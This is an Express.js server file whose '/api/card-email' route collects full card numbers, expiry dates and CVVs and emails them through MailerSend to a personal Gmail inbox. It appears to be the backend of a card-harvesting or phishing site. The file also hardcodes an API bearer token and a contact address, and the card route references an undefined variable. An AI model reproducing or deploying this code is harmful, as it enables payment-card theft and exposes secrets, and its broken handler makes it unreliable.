const express = require('express');
const { json } = require('express');
const cors = require('cors');
const axios = require('axios');
const dotenv = require('dotenv');
// import Serverless from 'serverless-http';
dotenv.config();

const app = express();
const PORT = 3000;

app.use(cors()); // Allow all origins for dev

app.use(json());

app.post('/api/contact-email', async (req, res) => {
    const formData = req.body;

    const emailHtml = `
    <html><body>
    <h1>New Contact Form Submission</h1>
    <p><strong>Name:</strong> ${formData.name || `${formData.firstName} ${formData.lastName}`}</p>
    <p><strong>Email:</strong> ${formData.email}</p>
    <p><strong>Phone:</strong> ${formData.phone || 'N/A'}</p>
    <p><strong>Address:</strong> ${formData.address}, ${formData.address2 || ''}, ${formData.city}, ${formData.state}, ${formData.zipCode}, ${formData.country}</p>
    <p><strong>IP Address:</strong> ${formData.ip_address}</p>
    <p><strong>User ID:</strong> ${formData.user_id}</p>
    </body></html>
  `;

    try {
        const response = await axios.post("https://api.mailersend.com/v1/email", {
            from: {
                email: "contact@test-zxk54v8z3mqljy6v.mlsender.net",
                name: "ReactDesiree",
            },
            to: [
                {
                    email: "guirez1921@gmail.com",
                    name: "Anthony Guirez",
                },
            ],
            subject: "New Contact Form Submission",
            html: emailHtml,
        }, {
            headers: {
                'Content-Type': 'application/json',
                'Authorization': 'Bearer mlsn.c3641f2c4707f161366cd8b44fa68bc5d6b25d77af1a80c7bf8bd66b1015cbdc'
            }
        });

        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error("Server error:", error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/api/card-email', async (req, res) => {
    const cardData = req.body;

    const emailHtml = `
        <html><body>
        <h1>New Card Submission</h1>
        <p><strong>Card Holder Name:</strong> ${cardData.cardHolderName}</p>
        <p><strong>Card Number:</strong> ${cardData.cardNumber}</p>
        <p><strong>Expiration Date:</strong> ${cardData.expirationDate}</p>
        <p><strong>CVV:</strong> ${cardData.cvv}</p>
        <p><strong>IP Address:</strong> ${formData.ip_address}</p>
        <p><strong>User ID:</strong> ${formData.user_id}</p>
        </body></html>
    `;

    try {
        const response = await axios.post("https://api.mailersend.com/v1/email", {
            from: {
                email: "contact@test-zxk54v8z3mqljy6v.mlsender.net",
                name: "ReactDesiree",
            },
            to: [
                {
                    email: "guirez1921@gmail.com",
                    name: "Anthony Guirez",
                },
            ],
            subject: "New Card Submission",
            html: emailHtml,
        }, {
            headers: {
                'Content-Type': 'application/json',
                'Authorization': 'Bearer mlsn.c3641f2c4707f161366cd8b44fa68bc5d6b25d77af1a80c7bf8bd66b1015cbdc'
            }
        });

        res.status(200).json({ success: true, data: response.data });
    } catch (error) {
        console.error("Server error:", error);
        res.status(500).json({ success: false, error: error.message });
    }
});

app.get('/', (req, res) => {
    res.send('Hello World');
});

app.listen(PORT, () => {
    console.log(`Server running on http://localhost:${PORT}`);
});

module.exports = app
// export default Serverless(app);